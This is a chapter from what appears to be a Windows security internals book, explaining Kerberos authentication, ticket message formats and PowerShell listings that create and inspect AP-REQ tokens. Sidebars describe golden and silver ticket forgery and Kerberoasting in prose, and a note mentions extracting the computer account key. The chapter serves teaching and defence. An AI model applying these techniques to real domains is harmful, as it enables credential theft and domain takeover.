<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" epub:prefix="index: http://www.index.com/" xml:lang="en" lang="en">
<head>
<title>14. Kerberos</title>
<link href="../styles/stylesheet.css" rel="stylesheet" type="text/css"/>
</head>
<body>
<div id="sbo-rt-content"><section aria-labelledby="ch14" epub:type="chapter" role="doc-chapter">
<hgroup>
<h2 class="CHAPTER" id="ch14">
<span class="CN"><span aria-label=" Page 457. " epub:type="pagebreak" id="pg_457" role="doc-pagebreak"></span><samp class="SANS_Futura_Std_Bold_Condensed_B_11">14</samp></span>
<span class="CT"><samp class="SANS_Dogma_OT_Bold_B_11">KERBEROS</samp></span>
</h2>
</hgroup>
<figure class="opener"><img alt="" class="opener" height="386" src="../images/chapter.jpg" width="386"/></figure>
<p class="ChapterIntro">In Windows 2000, the Kerberos authentication protocol replaced Netlogon as the primary mechanism for authenticating users on a domain controller. This chapter builds upon the description of interactive domain authentication in <span class="chapterintro_Xref"><a href="chapter12.xhtml">Chapter 12</a></span> to explain how a user can authenticate to a Windows domain using Kerberos.</p>
<p class="TX">We’ll start by looking at how Kerberos works, including how to generate the encryption keys used in the protocol, and decrypt Kerberos authentication tokens. Once you understand the inner workings of the protocol, we’ll cover the delegation of authentication and the role of Kerberos in user-to-user authentication protocols.</p>
<p class="TX">Kerberos was first developed at Massachusetts Institute of Technology (MIT) in the 1980s. Microsoft uses version 5 of the protocol, which was formalized in RFC1510 in 1993, then updated in RFC4120 in 2005. Microsoft has also made a few modifications to the protocol to support its own needs; I’ll mention some of these changes over the course of this chapter.</p>
<section aria-labelledby="sec1" epub:type="division">
<h3 class="H1" id="sec1"><span id="h1-102"></span><span aria-label=" Page 458. " epub:type="pagebreak" id="pg_458" role="doc-pagebreak"></span><samp class="SANS_Futura_Std_Bold_B_11">Interactive Authentication with Kerberos</samp></h3>
<p class="TNI1">As its primary function, Kerberos distributes <i>tickets</i>, each of which represents a user’s verified identity. The system can use this identity to determine whether the user can access a service, such as a file server. For example, if the user sends their ticket in a request to open a file, the file server can check its validity, then decide whether to grant the user access through something like an access check.</p>
<p class="TX">Kerberos provides a means of distributing these tickets securely over an untrusted network and allowing the tickets to be verified. It does this by using shared encryption keys, commonly derived from a user’s password, to encrypt and verify the tickets. The Active Directory server never stores the password in plaintext; it stores only the encryption key.</p>
<section aria-labelledby="sec2" epub:type="division">
<h4 class="H2" id="sec2"><span id="h2-153"></span><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Initial User Authentication</samp></h4>
<p class="TNI1"><a href="chapter14.xhtml#fig14-1">Figure 14-1</a> shows the initial Kerberos user authentication process between a client computer and the domain controller running the <i>key distribution center (KDC)</i> service. The KDC issues Kerberos tickets to users and manages session encryption keys.</p>
<figure class="IMG"><img alt="" class="img1" height="568" id="fig14-1" src="../images/Figure14-1.jpg" width="1652"/>
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 14-1: An overview of Kerberos authentication</samp></p></figcaption>
</figure>
<p class="TX">When the LSA processes a logon request, it first derives the shared encryption key based on the user’s password and a salt <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>. It generates the salt based on values, such as the username and realm, that depend on the type of encryption algorithm in use. We use the term <i>realm</i> to describe the scope of the Kerberos authentication. In Windows, the realm is the DNS name for the domain that contains the user, such as <i>mineral.local</i>. We can combine the username and the realm to form a user principal name, commonly written with an at symbol (@), as in <i>user@mineral.local</i>.</p>
<p class="TX">The LSA then generates an <i>authentication service request (AS-REQ)</i> message and sends it over the network to the authentication server <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>. The authentication server is the part of the KDC that is responsible for issuing an initial ticket to the authentication process. The AS-REQ message contains the username and realm as well as <i>pre-authentication data</i>, which consists of the current time encrypted with the user’s shared encryption key. The authentication <span aria-label=" Page 459. " epub:type="pagebreak" id="pg_459" role="doc-pagebreak"></span>server can look up the shared key from its key database using the specified username and realm, then use the key to decrypt the pre-authentication data <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>. If it succeeds, it has verified that the data has come from the user, as only the server and the client should know the shared encryption key.</p>
<p class="TX">The authentication server then generates a <i>ticket granting ticket (TGT)</i>, which it encrypts with the shared encryption key for a special user, <i>krbtgt</i>. The authenticating user doesn’t know the <i>krbtgt</i> user’s shared key, so they can’t decrypt the ticket. While the TGT has a special name, it’s essentially just a ticket that verifies the user’s identity to the <i>ticket granting server (TGS)</i>, which is responsible for issuing tickets for the user to authenticate to a network service. The ticket contains details about the user’s identity encoded in a <i>privilege attribute certificate (PAC)</i>, as well as a randomly generated session key for the TGS to use. We’ll see an example of a PAC in <span class="Xref">“Decrypting the AP-REQ Message” on page 469</span>.</p>
<p class="TX">The authentication server also generates a second data value and encrypts it with the user’s shared encryption key. This value, when decrypted, contains details about the ticket, such as how long it’s valid for. Eventually, a ticket expires, and the user will need to request a new TGT. This second value also contains the session encryption key, encrypted in the ticket. The authentication server packages the encrypted ticket and ticket information into the <i>authentication service reply (AS-REP)</i> message and sends it back to the client LSA <span aria-label="annotation4" class="CodeAnnotationCode">❹</span>. <a href="chapter14.xhtml#fig14-2">Figure 14-2</a> summarizes the format of this message.</p>
<figure class="IMG"><img alt="" class="img7" height="880" id="fig14-2" src="../images/Figure14-2.jpg" width="794"/>
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 14-2: The AS-REP message format</samp></p></figcaption>
</figure>
<p class="TX">Once the LSA receives the AS-REP, it can decrypt it and extract the session key from the encrypted ticket information by using the user’s shared encryption key. The successful decryption also demonstrates that the LSA is communicating with the correct authentication server, as another server wouldn’t know the user’s shared key.</p>
<p class="TX"><span aria-label=" Page 460. " epub:type="pagebreak" id="pg_460" role="doc-pagebreak"></span>But the LSA still doesn’t know all of the user’s information, as this information is stored in the PAC, which is encrypted in the ticket. To get the PAC, the LSA must request a ticket for itself from the TGS <span aria-label="annotation5" class="CodeAnnotationCode">❺</span>. To do so, the LSA packages up the TGT, which it can’t alter, with the <i>service principal name (SPN)</i> of the service it wants to access. The SPN is a string of the following form:</p>
<p class="ListPlain"><samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">service class/instance name/service name</samp></p>
<p class="TX">The <i>service class</i> is the type of service to use. The <i>instance name</i> is the hostname or network address that the service is running on. Finally, the <i>service name</i> is an optional value for disambiguating similar services on the same host. For the LSA to request a ticket for itself, it must set the service class to <samp class="SANS_TheSansMonoCd_W5Regular_11">HOST</samp> and the instance name to the current host, such as <i>graphite.mineral.local</i>. When converted to a string, this creates the following SPN: <samp class="SANS_TheSansMonoCd_W5Regular_11">HOST/graphite.mineral.local</samp>.</p>
<p class="TX">You might remember that we used this string format to specify a target name for NTLM authentication in <span class="Xref"><a href="chapter13.xhtml">Chapter 13</a></span>. In fact, Windows took this format from Kerberos and applied it to NTLM to try to counter NTLM relay attacks.</p>
<p class="TX">To ensure that the server can verify its request, the LSA will also generate a cryptographic hash of the TGT. This hash encompasses the SPN, a timestamp, and a unique sequence number, all encrypted with the session key from the AS-REP’s encrypted data value. This additional encrypted value is called the <i>authenticator</i>. The TGT, SPN, and authenticator are packaged up in a <i>ticket granting service request (TGS-REQ)</i> message and sent to the TGS. <a href="chapter14.xhtml#fig14-3">Figure 14-3</a> summarizes the format of this message.</p>
<figure class="IMG"><img alt="" class="img7" height="1076" id="fig14-3" src="../images/Figure14-3.jpg" width="890"/>
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 14-3: The TGS-REQ message format</samp></p></figcaption>
</figure>
<p class="TX"><span aria-label=" Page 461. " epub:type="pagebreak" id="pg_461" role="doc-pagebreak"></span>The TGS receives the TGS-REQ message, and because it knows the shared encryption key for the <i>krbtgt</i> user, it can decrypt the TGT. This allows it to extract details about the user, as well as the session key. It can then verify that the ticket hasn’t expired or isn’t otherwise invalid (which would be the case if the user weren’t allowed to authenticate to the domain or service).</p>
<p class="TX">The TGS can use the session key from the ticket to decrypt the authenticator and verify that the hash matches the associated information. This process ensures that only a user with access to the shared encryption key could have extracted the session key from the AS-REP and encrypted the contents of the authenticator for this TGT. The TGS then verifies that the timestamp is recent. Typically, it will reject the request if the timestamp is older than five minutes. For this reason, it’s crucial to Kerberos authentication that the client and server systems have synchronized clocks. The TGS also checks that it hasn’t already seen the ticket’s sequence number. This check counters replay attacks, in which the same TGS-REQ is sent multiple times.</p>
<p class="TX">If all the checks pass, the TGS can look up the SPN in the key database to retrieve an encryption key. Technically, each SPN could have its own encryption key, but Active Directory usually just maps these SPNs to a user or computer account. For example, the <samp class="SANS_TheSansMonoCd_W5Regular_11">HOST/graphite.mineral.local</samp> SPN is mapped to the computer account for the <i>GRAPHITE</i> machine. You can query the SPNs an account is mapped to using the <samp class="SANS_TheSansMonoCd_W5Regular_11">setspn</samp> utility or the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-ADComputer</samp> PowerShell command, as shown in <a href="chapter14.xhtml#Lis14-1">Listing 14-1</a>.</p>
<span id="Lis14-1"></span><pre><code>PS&gt; <b>Get-ADComputer -Identity $env:COMPUTERNAME -Properties ServicePrincipalNames |</b> <b>Select-Object -ExpandProperty ServicePrincipalNames</b>
HOST/GRAPHITE
TERMSRV/GRAPHITE.mineral.local
RestrictedKrbHost/GRAPHITE.mineral.local
HOST/GRAPHITE.mineral.local
TERMSRV/GRAPHITE
RestrictedKrbHost/GRAPHITE
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-1: Enumerating SPNs mapped to the current computer account</span></p>
<p class="TX">Assuming the host exists, the TGS can extract the shared encryption key for the <samp class="SANS_TheSansMonoCd_W5Regular_11">HOST</samp> service ticket it will generate. If you return to <a href="chapter14.xhtml#fig14-1">Figure 14-1</a>, you’ll see that the TGS will copy the PAC from the decrypted TGT into this new ticket and encrypt it with the session key for the SPN <span aria-label="annotation6" class="CodeAnnotationCode">❻</span>. The TGS generates the same encrypted data as it did with the AS-REP, including the session key for the service to use. Then it packages the new ticket and the encrypted value into the <i>ticket granting service reply (TGS-REP)</i> and returns it to the client <span aria-label="annotation7" class="CodeAnnotationCode">❼</span>. <a href="chapter14.xhtml#fig14-4">Figure 14-4</a> summarizes the format of the TGS-REP message.</p>
<span aria-label=" Page 462. " epub:type="pagebreak" id="pg_462" role="doc-pagebreak"></span>
<figure class="IMG"><img alt="" class="img7" height="914" id="fig14-4" src="../images/Figure14-4.jpg" width="865"/>
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 14-4: The TGS-REP message format</samp></p></figcaption>
</figure>
<p class="TX">The LSA can now verify that it can decrypt the contents of the ticket and ensure the ticket targets the <samp class="SANS_TheSansMonoCd_W5Regular_11">HOST</samp> SPN it requested. In particular, as the last step in <a href="chapter14.xhtml#fig14-1">Figure 14-1</a>, it uses the PAC to create the new user’s <samp class="SANS_TheSansMonoCd_W5Regular_11">Token</samp> object <span aria-label="annotation8" class="CodeAnnotationCode">❽</span>. This completes the authentication process. The user has now been authenticated, and the system can start its logon session, console session, and processes.</p>
<aside aria-label="box-1" class="box">
<p class="BoxTitle" id="box-1"><samp class="SANS_Dogma_OT_Bold_B_11">GOLDEN TICKETS</samp></p>
<p class="BoxBodyFirst"><samp class="SANS_Futura_Std_Book_11">The Kerberos protocol relies on keeping the shared encryption keys secret. If an attacker gets hold of the shared keys or the passwords from which they’re derived, they could generate their own Kerberos tickets with any security information they like.</samp></p>
<p class="BoxBody"><samp class="SANS_Futura_Std_Book_11">One attack that uses this approach involves forging a</samp> <samp class="SANS_Futura_Std_Book_Oblique_I_11">golden ticket</samp><samp class="SANS_Futura_Std_Book_11">. This is possible when the</samp> <samp class="SANS_Futura_Std_Book_Oblique_I_11">krbtgt</samp> <samp class="SANS_Futura_Std_Book_11">user’s encryption key has been disclosed. This allows the attacker to encrypt a TGT with their own PAC, then use it to make a request to the TGS for a service ticket. As the ticket has been correctly encrypted, the TGS will verify it and issue a ticket for any target service with the user information from the TGT’s PAC. For example, you could craft a service ticket with a domain administrator PAC to gain complete access to any system in a domain.</samp></p>
<p class="BoxBodyLast"><samp class="SANS_Futura_Std_Book_11">Getting the</samp> <samp class="SANS_Futura_Std_Book_Oblique_I_11">krbtgt</samp> <samp class="SANS_Futura_Std_Book_11">encryption key usually requires compromising a domain controller and extracting the key from there. Doing this might seem reductive, because if you compromise the domain controller, you can already control ticket issuance, but there are still advantages to gaining the</samp> <samp class="SANS_Futura_Std_Book_Oblique_I_11">krbtgt</samp> <samp class="SANS_Futura_Std_Book_11">key. For</samp> <span aria-label=" Page 463. " epub:type="pagebreak" id="pg_463" role="doc-pagebreak"></span><samp class="SANS_Futura_Std_Book_11">example, there could be multiple domain controllers on an enterprise network, and these domains will share a</samp> <samp class="SANS_Futura_Std_Book_Oblique_I_11">krbtgt</samp> <samp class="SANS_Futura_Std_Book_11">encryption key. So, an attacker could compromise the weakest configured system, extract the key, and use it to mount a wider attack on the network to compromise all domain controllers. This is why Microsoft and the industry recommend rotating the</samp> <samp class="SANS_Futura_Std_Book_Oblique_I_11">krbtgt</samp> <samp class="SANS_Futura_Std_Book_11">key regularly, and have provided scripts to do this in a safe manner.</samp></p>
</aside>
</section>
<section aria-labelledby="sec3" epub:type="division">
<h4 class="H2" id="sec3"><span id="h2-154"></span><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Network Service Authentication</samp></h4>
<p class="TNI1">Once the user has been authenticated to the local machine, the LSA must cache the following information before the user can communicate with other services on the network: the user’s shared encryption key, which is based on their password; the TGT, to request additional service tickets; and the TGT session key.</p>
<p class="TX">The SSPI APIs discussed in the previous chapter include a Kerberos security package that handles the network service authentication process to retrieve a valid ticket for a network service based on its SPN. <a href="chapter14.xhtml#fig14-5">Figure 14-5</a> provides an overview of the process of getting a ticket for a network service.</p>
<figure class="IMG"><img alt="" class="img1" height="933" id="fig14-5" src="../images/Figure14-5.jpg" width="1656"/>
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 14-5: Kerberos authentication to a network service</samp></p></figcaption>
</figure>
<p class="TX">This authentication process involves three systems: the client, the server, and the KDC. The first thing the client does is call the <samp class="SANS_TheSansMonoCd_W5Regular_11">InitializeSecurityContext</samp> SSPI API with the user credentials and the network service’s SPN <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>.</p>
<p class="TX"><span aria-label=" Page 464. " epub:type="pagebreak" id="pg_464" role="doc-pagebreak"></span>In <a href="chapter14.xhtml#fig14-5">Figure 14-5</a>, we’re assuming that we’re making the authentication request as an existing authenticated user with a cached TGT. If we’re not, and we’ve specified a username and password, the LSA needs to get the TGT for that user by following the authentication process outlined in the previous section. If the LSA already has a valid TGT, it can make a request to the TGS for a new ticket targeting the specified SPN <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>.</p>
<p class="TX">The TGS then verifies that the TGT is valid and that the caller knows the session key, which it can extract with knowledge of the user’s shared key. Once it has verified this value, the TGS looks up the shared encryption key for the target SPN. If the SPN doesn’t exist or the user isn’t allowed to use the service, it returns an error, which the LSA will report to the caller. If everything occurs correctly, the TGS will generate the TGS-REP message with the new ticket and return it to the client’s LSA <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>.</p>
<p class="TX">As with the original TGT, the TGS encrypts the ticket using a key the client shouldn’t have access to. However, it encrypts the extra encrypted value using the TGT’s session key, which the LSA can decrypt. This encrypted value contains the session key for communicating with the service. The LSA takes the ticket and generates an authenticator encrypted with the service session key, then packages the ticket and authenticator into an <i>authentication protocol request (AP-REQ)</i> message. The structure of this message is basically the same as that of the TGS-REQ message, but the request is sent to the service rather than the TGS.</p>
<p class="TX">The LSA returns this AP-REQ to the user <span aria-label="annotation4" class="CodeAnnotationCode">❹</span>. At this point, the client application regains control of the authentication process, and it can package up the AP-REQ into the network protocol and transmit it to the server <span aria-label="annotation5" class="CodeAnnotationCode">❺</span>. The server extracts the AP-REQ and passes it to its own LSA via the <samp class="SANS_TheSansMonoCd_W5Regular_11">AcceptSecurityContext</samp> API <span aria-label="annotation6" class="CodeAnnotationCode">❻</span>.</p>
<p class="TX">The LSA on the server should already have the shared encryption key for the cached ticket. It’s common to tie the SPN to the computer account used by the <i>Local System</i> user. Therefore, any privileged service, such as the SMB server, should have access to the computer’s password needed to decrypt the ticket. If the service is running as a user, the system must have configured an SPN mapping for that user before the ticket can be accepted.</p>
<p class="TX">Assuming it can decrypt and verify the ticket, the server’s LSA will then extract the PAC from the ticket and build a local token for the user. The PAC has a signature that the server can use to verify that it hasn’t been tampered with. Also, an optional verification process can ensure that the PAC was issued by the KDC. The network service can now use the generated token to impersonate the authenticating user <span aria-label="annotation7" class="CodeAnnotationCode">❼</span>.</p>
<p class="TX">The final step in <a href="chapter14.xhtml#fig14-5">Figure 14-5</a> is optional. By default, the server doesn’t need to return anything to the client to complete the authentication; it has everything it needs to decrypt the ticket and let the service access the user’s identity. However, you might want to ensure that the server you’re talking to knows the ticket’s key and isn’t lying. One way that the server can prove it knows the encryption key is to encrypt or sign something using the ticket’s session key and return this to the client. We refer to this practice as <i>mutual authentication</i>.</p>
<p class="TX">Kerberos uses the <i>authentication protocol reply (AP-REP)</i> message to send this encrypted value back to the client <span aria-label="annotation8" class="CodeAnnotationCode">❽</span>. The AP-REP message contains an authenticator value like the one sent in the AP-REQ, but it has a slightly <span aria-label=" Page 465. " epub:type="pagebreak" id="pg_465" role="doc-pagebreak"></span>different format, as it is encrypted using the session key. Because only a valid recipient of the ticket could have decrypted the session key to encrypt the authenticator, this verifies the server’s identity.</p>
<aside aria-label="box-2" class="box">
<p class="BoxTitle" id="box-2"><samp class="SANS_Dogma_OT_Bold_B_11">SILVER TICKETS AND KERBEROASTING</samp></p>
<p class="BoxBodyFirst"><samp class="SANS_Futura_Std_Book_11">A</samp> <samp class="SANS_Futura_Std_Book_Oblique_I_11">silver ticket</samp> <samp class="SANS_Futura_Std_Book_11">is a more limited type of forged ticket than the golden ticket, but it’s potentially easier to obtain. This attack uses a service’s shared encryption key instead of the</samp> <samp class="SANS_Futura_Std_Book_Oblique_I_11">krbtgt</samp> <samp class="SANS_Futura_Std_Book_11">key to forge a ticket for a service without requesting it from the domain controller. The contents of the ticket, including the PAC, can impersonate any domain user, including privileged users. Note that this PAC modification works only if the server doesn’t verify it with the KDC. This verification is generally not enabled when the server is running as a privileged user such as</samp> <samp class="SANS_Futura_Std_Book_Oblique_I_11">SYSTEM</samp><samp class="SANS_Futura_Std_Book_11">.</samp></p>
<p class="BoxBody"><samp class="SANS_Futura_Std_Book_11">How would an attacker get the shared encryption key for a service? They might have previously compromised the server and extracted the service key from the LSA. If the key hasn’t changed, it could enable a long-term compromise of a service. Another approach is to brute-force the password used to derive the encryption key. If the attacker can guess a password, they could encrypt a service ticket and check whether the service accepts it.</samp></p>
<p class="BoxBodyLast"><samp class="SANS_Futura_Std_Book_11">A more efficient attack, called</samp> <samp class="SANS_Futura_Std_Book_Oblique_I_11">Kerberoasting</samp><samp class="SANS_Futura_Std_Book_11">, takes advantage of the fact that the service ticket requested from the TGS is already encrypted using the service’s key. The attacker can request a service ticket for their target, then use the returned information used to mount an offline brute-force attack against the password. We’ll cover an example of Kerberoasting in this chapter’s worked examples.</samp></p>
</aside>
</section>
</section>
<section aria-labelledby="sec4" epub:type="division">
<h3 class="H1" id="sec4"><span id="h1-103"></span><samp class="SANS_Futura_Std_Bold_B_11">Performing Kerberos Authentication in PowerShell</samp></h3>
<p class="TNI1">How much of the network service authentication process can we observe from PowerShell? Let’s find out. We’ll start by getting the credentials handle, as shown in <a href="chapter14.xhtml#Lis14-2">Listing 14-2</a>.</p>
<span id="Lis14-2"></span><pre><code><span aria-label="annotation1" class="CodeAnnotationHang1">❶</span> PS&gt; <b>$credout = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Outbound</b>
<span aria-label="annotation2" class="CodeAnnotationHang1">❷</span> PS&gt; <b>$spn = "HOST/$env:COMPUTERNAME"</b>
PS&gt; <b>$client = New-LsaClientContext -CredHandle $credout</b> <b>-Target $spn</b>
PS&gt; <b>Format-LsaAuthToken -Token $client.Token</b>
<span aria-label="annotation3" class="CodeAnnotationHang1">❸</span> &lt;KerberosV5 KRB_AP_REQ&gt;
Options         : None
&lt;Ticket&gt;
Ticket Version  : 5
<span aria-label="annotation4" class="CodeAnnotationHang1">❹</span> ServerName      : SRV_INST - HOST/GRAPHITE
Realm           : MINERAL.LOCAL
<span aria-label="annotation5" class="CodeAnnotationHang1">❺</span> Encryption Type : AES256_CTS_HMAC_SHA1_96
<span aria-label="annotation6" class="CodeAnnotationHang1">❻</span> Key Version     : 1
Cipher Text     :
<span aria-label=" Page 466. " epub:type="pagebreak" id="pg_466" role="doc-pagebreak"></span>00000000: B2 9F B5 0C 7E D9 C4 7F 4A DA 19 CB B4 98 AD 33
00000010: 20 3A 2E C3 35 0B F3 FE 2D FF A7 FD 00 2B F2 54
<var>--snip--</var>
00000410: B7 52 F1 0C 7F 0A C8 5E 87 AD 54 4A
<span aria-label="annotation7" class="CodeAnnotationHang1">❼</span> &lt;Authenticator&gt;
Encryption Type : AES256_CTS_HMAC_SHA1_96
Cipher Text     :
00000000: E4 E9 55 CB 40 41 27 05 D0 52 92 79 76 91 4D 8D
00000010: A1 F2 56 D1 23 1F BF EC 7A 60 14 0E 00 B6 AD 3D
<var>--snip--</var>
00000190: 04 D4 E4 5D 18 60 DB C5 FD
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-2: Setting up a client authentication context for Kerberos</span></p>
<p class="TX">In this case, we specify the <samp class="SANS_TheSansMonoCd_W5Regular_11">Kerberos</samp> package <span aria-label="annotation1" class="CodeAnnotationCode">❶</span> instead of the <samp class="SANS_TheSansMonoCd_W5Regular_11">NTLM</samp> package we used in the previous chapter. Once we receive the handle, we can create a client authentication context. To do this, we must specify an SPN to authenticate to; here I’ve picked the <samp class="SANS_TheSansMonoCd_W5Regular_11">HOST</samp> SPN on the local computer <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>.</p>
<p class="TX">At this point, the LSA should get a ticket for the service by using the previously negotiated TGT and sending a TGS-REQ. If the SPN is incorrect or unknown, the TGS will return an error, which the LSA will pass back to us when it creates the client authentication context. The error will look like the following:</p>
<pre><code>(0x80090303) - The specified target is unknown or unreachable
</code></pre>
<p class="TX">In <a href="chapter14.xhtml#Lis14-2">Listing 14-2</a>, the only thing we receive is the AP-REQ <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>; we don’t receive the TGS-REQ or the TGS-REP. Because we formatted the fields of the Kerberos authentication token, we can see only the values available in plaintext. This includes a set of option flags currently set to <samp class="SANS_TheSansMonoCd_W5Regular_11">None</samp>; other values would indicate various properties of the request, which we’ll come back to when we discuss configuring the optional mutual authentication.</p>
<p class="TX">The ticket also contains the target SPN and realm <span aria-label="annotation4" class="CodeAnnotationCode">❹</span>, which the server needs to select the correct shared encryption key. You can recognize an SPN based on the presence of the <samp class="SANS_TheSansMonoCd_W5Regular_11">SRV_INST</samp> name type, which indicates a service instance.</p>
<p class="TX">Next, the ticket specifies the encryption parameters. First it lists the algorithm used to encrypt and verify the ciphertext. In this case, it uses AES ciphertext-stealing mode (CTS) with a 256-bit key for encryption and a SHA1 HMAC truncated to 96 bits <span aria-label="annotation5" class="CodeAnnotationCode">❺</span>. <a href="chapter14.xhtml#tab14-1">Table 14-1</a> shows other common encryption algorithms used by Windows.</p>
<table class="Basic-Table">
<caption><p class="TT" id="tab14-1"><span class="Heavy"><samp class="SANS_Futura_Std_Heavy_B_11">Table 14-1:</samp></span> <samp class="SANS_Futura_Std_Book_11">Common Kerberos Encryption Types on Windows</samp></p></caption>
<thead>
<tr>
<th class="Basic-Table TCH" scope="col"><p class="TableHeader"><samp class="SANS_Futura_Std_Heavy_B_11">Name</samp></p></th>
<th class="Basic-Table TCH" scope="col"><p class="TableHeader"><samp class="SANS_Futura_Std_Heavy_B_11">Encryption</samp></p></th>
<th class="Basic-Table TCH" scope="col"><p class="TableHeader"><samp class="SANS_Futura_Std_Heavy_B_11">Verification</samp></p></th>
</tr>
</thead>
<tbody>
<tr>
<td class="Basic-Table TBF"><p class="TableBody"><samp class="SANS_TheSansMonoCd_W5Regular_11">AES256_CTS_HMAC_SHA1_96</samp></p></td>
<td class="Basic-Table TBF"><p class="TableBody"><samp class="SANS_Futura_Std_Book_11">AES CTS 256-bit</samp></p></td>
<td class="Basic-Table TBF"><p class="TableBody"><samp class="SANS_Futura_Std_Book_11">SHA1 HMAC truncated to 96 bits</samp></p></td>
</tr>
<tr>
<td class="Basic-Table TB"><p class="TableBody"><samp class="SANS_TheSansMonoCd_W5Regular_11">AES128_CTS_HMAC_SHA1_96</samp></p></td>
<td class="Basic-Table TB"><p class="TableBody"><samp class="SANS_Futura_Std_Book_11">AES CTS 128-bit</samp></p></td>
<td class="Basic-Table TB"><p class="TableBody"><samp class="SANS_Futura_Std_Book_11">SHA1 HMAC truncated to 96 bits</samp></p></td>
</tr>
<tr>
<td class="Basic-Table TB"><p class="TableBody"><samp class="SANS_TheSansMonoCd_W5Regular_11">DES_CBC_MD5</samp></p></td>
<td class="Basic-Table TB"><p class="TableBody"><samp class="SANS_Futura_Std_Book_11">DES 56-bit</samp></p></td>
<td class="Basic-Table TB"><p class="TableBody"><samp class="SANS_Futura_Std_Book_11">MD5 HMAC</samp></p></td>
</tr>
<tr>
<td class="Basic-Table TBL"><p class="TableBody"><samp class="SANS_TheSansMonoCd_W5Regular_11">ARCFOUR_HMAC_MD5</samp></p></td>
<td class="Basic-Table TBL"><p class="TableBody"><samp class="SANS_Futura_Std_Book_11">RC4</samp></p></td>
<td class="Basic-Table TBL"><p class="TableBody"><samp class="SANS_Futura_Std_Book_11">MD5 HMAC</samp></p></td>
</tr>
</tbody>
</table>
<p class="TX"><span aria-label=" Page 467. " epub:type="pagebreak" id="pg_467" role="doc-pagebreak"></span>Notice that the ticket contains the <i>key version number</i> <span aria-label="annotation6" class="CodeAnnotationCode">❻</span>. When a user or computer changes its password, the shared encryption key must also change. To ensure that the system selects the correct key, it stores this version number with the password-derived key and increments it upon every key change. In this case, the version is 1, which means the computer has never changed its password.</p>
<p class="TX">The presence of the key version number indicates that the ticket is encrypted with a long-lived shared encryption key. A missing version number would indicate that the ticket was encrypted with a previously negotiated session key. Because we’re looking at the first message being sent to the service as part of this authentication process, the client and service do not currently share any session key, so the client must use the computer’s shared encryption key.</p>
<p class="TX">The encrypted ciphertext follows the key information. Since we don’t know the encryption key, we can’t decrypt it. Following the ticket is the authenticator <span aria-label="annotation7" class="CodeAnnotationCode">❼</span>, which also starts by listing key information. Notice the lack of a key version number; it’s missing here because the authenticator is encrypted with the session key inside the ticket.</p>
<blockquote>
<p class="NOTE"><span class="NoteHead"><samp class="SANS_Dogma_OT_Bold_B_15">NOTE</samp></span></p>
<p class="NOTE-TXT"><i>In this case, because we’ve generated a ticket targeting the computer we’re currently running on, we could extract the computer account encryption key, either by directly accessing it in memory or from the MACHINE.ACC$ LSA secret in the registry. This process is outside the scope of this chapter.</i></p>
</blockquote>
<p class="TX">We can complete the authentication process by passing the client authentication token to a server authentication context, in the same way we did when using NTLM authentication in <span class="Xref"><a href="chapter13.xhtml">Chapter 13</a></span>. <a href="chapter14.xhtml#Lis14-3">Listing 14-3</a> demonstrates this.</p>
<span id="Lis14-3"></span><pre><code>PS&gt; <b>$credin = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Inbound</b>
PS&gt; <b>$server = New-LsaServerContext -CredHandle $credin</b>
PS&gt; <b>Update-LsaServerContext -Server $server -Token $client.Token</b>
Exception calling "Continue" with "1" argument(s):
"(0x8009030C) - The logon attempt failed"
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-3: Completing the Kerberos authentication</span></p>
<p class="TX">We set up the server authentication context, then update the context with the client’s authentication token. However, when we call the <samp class="SANS_TheSansMonoCd_W5Regular_11">Update-LsaServerContext</samp> PowerShell command, the authentication fails with an error. Perhaps this shouldn’t come as a massive surprise. Only the <i>Local System</i> user has direct access to the shared encryption key for the computer account used for the <samp class="SANS_TheSansMonoCd_W5Regular_11">HOST</samp> SPN. Therefore, when the LSA verifies the AP-REQ, it can’t decrypt it and returns an error.</p>
<p class="TX">Can we find an SPN that we can negotiate locally? Windows specifies a <samp class="SANS_TheSansMonoCd_W5Regular_11">RestrictedKrbHost</samp> service class. The SPN for the local computer with this service class is mapped to the computer account, so the ticket is once again encrypted using the computer account’s key. However, the LSA treats the service class specially and will allow any user on the system to decrypt it, <span aria-label=" Page 468. " epub:type="pagebreak" id="pg_468" role="doc-pagebreak"></span>unlike with <samp class="SANS_TheSansMonoCd_W5Regular_11">HOST</samp>. When we change the command to use the restricted service class instead, we get the output shown in <a href="chapter14.xhtml#Lis14-4">Listing 14-4</a>.</p>
<span id="Lis14-4"></span><pre><code>PS&gt; <b>$credout = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Outbound</b>
<span aria-label="annotation1" class="CodeAnnotationHang1">❶</span> PS&gt; <b>$spn = "RestrictedKrbHost/$env:COMPUTERNAME"</b>
PS&gt; <b>$client = New-LsaClientContext -CredHandle $credout -Target $spn</b>
PS&gt; <b>Format-LsaAuthToken -Token $client.Token</b>
&lt;KerberosV5 KRB_AP_REQ&gt;
Options         : None
&lt;Ticket&gt;
Ticket Version  : 5
<span aria-label="annotation2" class="CodeAnnotationHang1">❷</span> ServerName      : SRV_INST - RestrictedKrbHost/GRAPHITE
<var>--snip--</var>

